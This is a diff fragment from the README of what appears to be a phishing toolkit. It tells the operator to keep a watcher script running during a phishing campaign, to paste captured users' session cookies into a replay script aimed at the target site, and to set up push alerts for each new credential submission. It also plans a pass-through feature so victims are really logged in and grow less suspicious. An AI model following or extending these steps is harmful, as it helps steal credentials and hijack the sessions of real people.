@@ -6,4 +6,9 @@
 	5. run watchdog.py and leave it running while you phish. Might be helpful to make a service of some kind.
 	6. Once you capture user's creds copy and paste the cookies into phishreplay.py , point it to the site, and run it
 
+## Tips
+I highly recommend getting pushover and putting your token in phishforward.py, this will alert you whenever a new submission occurs.
 
+## Needed Updates:
+
+Update to support pass-through so users will actually be authed to the site (and thus less suspicious)
